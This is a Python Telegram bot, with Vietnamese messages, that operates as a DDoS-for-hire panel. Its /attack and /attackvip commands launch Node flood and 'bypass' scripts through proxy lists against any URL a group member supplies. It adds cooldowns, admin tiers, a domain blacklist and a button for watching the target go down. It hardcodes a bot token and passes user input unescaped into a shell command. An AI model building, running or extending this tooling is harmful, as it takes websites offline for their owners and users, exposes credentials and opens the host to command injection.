import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import time, threading, subprocess, random, json, os
from urllib.parse import quote_plus

# --- CONFIG ---
BOT_TOKEN = "7631197339:AAGwjDYsiZttkgmESFrZoO6FlHyaukJRPOE"
GROUP_ID = -1002535925512
ADMIN_FILE = "admins.json"
PROXY_FILE = "proxy.txt"
VIP_PROXY = "text.txt"
BLACKLIST = [
    "thcsnguyentrai.pgdductrong.edu.vn", "intenseapi.com", "edu.vn",
    "thisinh.thitotnghiepthpt.edu.vn", "gov.vn", "stats.firewall.mom",
    "www.nasa.gov", "neverlosevip.store", "youtube.com", "google.com",
    "facebook.com", "chinhphu.vn"
]

MAX_USER_TIME = 60
DEFAULT_RATE = 20
DEFAULT_THREAD = 10
bot_status = True
user_last_attack_time = {}
attack_processes = []
start_time = time.time()

# --- ADMIN LOAD/SAVE ---
def load_admins():
    if not os.path.exists(ADMIN_FILE):
        return {"main_admin": 123456789, "sub_admins": []}
    with open(ADMIN_FILE, "r") as f:
        return json.load(f)

def save_admins(data):
    with open(ADMIN_FILE, "w") as f:
        json.dump(data, f, indent=4)

admin_data = load_admins()
ADMIN_MAIN_ID = admin_data["main_admin"]
ADMIN_IDS = [ADMIN_MAIN_ID] + admin_data["sub_admins"]

def is_sub_admin(user_id):
    return user_id in admin_data["sub_admins"]

def is_blacklisted(url):
    return any(black in url for black in BLACKLIST)

# --- COMMANDS ---
def start(update, context):
    status = "ON" if bot_status else "OFF"
    update.message.reply_text(
        f"Bot đang: [{status}]\n"
        f"/attack <url> <time>\n"
        f"/attackvip <url> <time> <flood|bypass>\n"
        f"/proxy - Xem so luong proxy\n"
        f"/time - Xem uptime bot\n"
        f"/addadmin <id>, /deladmin <id> (admin chinh)\n"
        f"/listadmin - Xem danh sach admin"
    )

def attack(update, context):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    now = time.time()

    if chat_id != GROUP_ID:
        update.message.reply_text("Box chưa được duyệt.")
        return
    if not bot_status:
        update.message.reply_text("Bot đang tắt.")
        return
    if user_id not in ADMIN_IDS and now - user_last_attack_time.get(user_id, 0) < MAX_USER_TIME:
        wait = int(MAX_USER_TIME - (now - user_last_attack_time[user_id]))
        update.message.reply_text(f"Chờ {wait} giây nữa.")
        return

    try:
        url = context.args[0]
        duration = int(context.args[1])
        if user_id not in ADMIN_IDS and duration > MAX_USER_TIME:
            update.message.reply_text(f"Tối đa {MAX_USER_TIME} giây.")
            return

        if is_blacklisted(url):
            update.message.reply_text("URL này bị cấm.")
            return

        command = f"node bypass.js {url} {duration} {DEFAULT_RATE} {DEFAULT_THREAD} {PROXY_FILE}"
        proc = subprocess.Popen(command, shell=True)
        attack_processes.append(proc)
        user_last_attack_time[user_id] = now

        time_str = time.strftime("%H:%M:%S %d/%m/%Y", time.localtime(now))
        json_text = f"""{{
  "Status": "✨🗿🚦 Attack Started 🛸🚥✨",
  "Caller": "@{update.effective_user.username or user_id}",
  "PID": {int(now)},
  "Website": "{url}",
  "Time": "{duration} Giay",
  "MaxTime": {MAX_USER_TIME},
  "Method": "flood",
  "StartTime": "{time_str}"
}}"""

        check_url = f"https://check-host.net/check-http?host={quote_plus(url)}"
        keyboard = [[InlineKeyboardButton("Kiểm Tra Website", url=check_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        context.bot.send_message(chat_id=chat_id, text=json_text, reply_markup=reply_markup)

        threading.Timer(duration, lambda: context.bot.send_message(chat_id=chat_id, text="✅ Đã hoàn tất attack!")).start()

    except:
        update.message.reply_text("Sai cú pháp: /attack <url> <time>")

def attackvip(update, context):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        update.message.reply_text("Chỉ admin được dùng.")
        return
    try:
        url = context.args[0]
        duration = int(context.args[1])
        method = context.args[2].lower()
        if method not in ["flood", "bypass"]:
            update.message.reply_text("Phương thức phải là 'flood' hoặc 'bypass'.")
            return

        command = f"node zentra.js {url} {duration} 20 15 {VIP_PROXY} {method}"
        proc = subprocess.Popen(command, shell=True)
        attack_processes.append(proc)
        user_last_attack_time[user_id] = time.time()

        time_str = time.strftime("%H:%M:%S %d/%m/%Y", time.localtime())
        json_text = f"""{{
  "Status": "✨ VIP Attack Started ✨",
  "Caller": "@{update.effective_user.username or user_id}",
  "PID": {int(time.time())},
  "URL": "{url}",
  "Time": "{duration} Giay",
  "Rate": "20",
  "Thread": "15",
  "Proxy": "{VIP_PROXY}",
  "Method": "{method}",
  "StartTime": "{time_str}"
}}"""

        check_url = f"https://check-host.net/check-http?host={quote_plus(url)}"
        keyboard = [[InlineKeyboardButton("Kiểm Tra Website", url=check_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        context.bot.send_message(chat_id=update.effective_chat.id, text=json_text, reply_markup=reply_markup)

        threading.Timer(duration, lambda: context.bot.send_message(chat_id=update.effective_chat.id, text="✅ VIP attack hoàn tất!")).start()

    except:
        update.message.reply_text("Sai cú pháp: /attackvip <url> <time> <flood|bypass>")

def proxy(update, context):
    try:
        with open("text.txt", "r") as f:
            lines = [line.strip() for line in f]
        context.bot.send_message(update.effective_chat.id, f"Số lượng proxy: {len(lines)}")
        context.bot.send_document(update.effective_chat.id, open("text.txt", "rb"))
    except FileNotFoundError:
        update.message.reply_text("Không tìm thấy file proxy.")

def show_uptime(update, context):
    uptime = int(time.time() - start_time)
    h = uptime // 3600
    m = (uptime % 3600) // 60
    s = uptime % 60
    update.message.reply_text(f"Bot đã hoạt động: {h} giờ, {m} phút, {s} giây")

def add_admin(update, context):
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("Chỉ admin chính được thêm.")
        return
    try:
        new_id = int(context.args[0])
        if new_id in ADMIN_IDS:
            update.message.reply_text("ID này đã là admin.")
        else:
            admin_data["sub_admins"].append(new_id)
            save_admins(admin_data)
            ADMIN_IDS.append(new_id)
            update.message.reply_text(f"Đã thêm admin phụ: {new_id}")
    except:
        update.message.reply_text("Sai cú pháp: /addadmin <id>")

def del_admin(update, context):
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("Chỉ admin chính được xóa.")
        return
    try:
        rem_id = int(context.args[0])
        if rem_id not in admin_data["sub_admins"]:
            update.message.reply_text("ID không tồn tại trong admin phụ.")
        else:
            admin_data["sub_admins"].remove(rem_id)
            save_admins(admin_data)
            ADMIN_IDS.remove(rem_id)
            update.message.reply_text(f"Đã xóa admin phụ: {rem_id}")
    except:
        update.message.reply_text("Sai cú pháp: /deladmin <id>")

def list_admin(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        return
    msg = f"ADMIN CHÍNH: {ADMIN_MAIN_ID}\nSUB ADMIN: {', '.join(map(str, admin_data['sub_admins']))}"
    update.message.reply_text(msg)

# --- MAIN ---
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("attack", attack, pass_args=True))
    dp.add_handler(CommandHandler("attackvip", attackvip, pass_args=True))
    dp.add_handler(CommandHandler("proxy", proxy))
    dp.add_handler(CommandHandler("time", show_uptime))
    dp.add_handler(CommandHandler("addadmin", add_admin, pass_args=True))
    dp.add_handler(CommandHandler("deladmin", del_admin, pass_args=True))
    dp.add_handler(CommandHandler("listadmin", list_admin))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
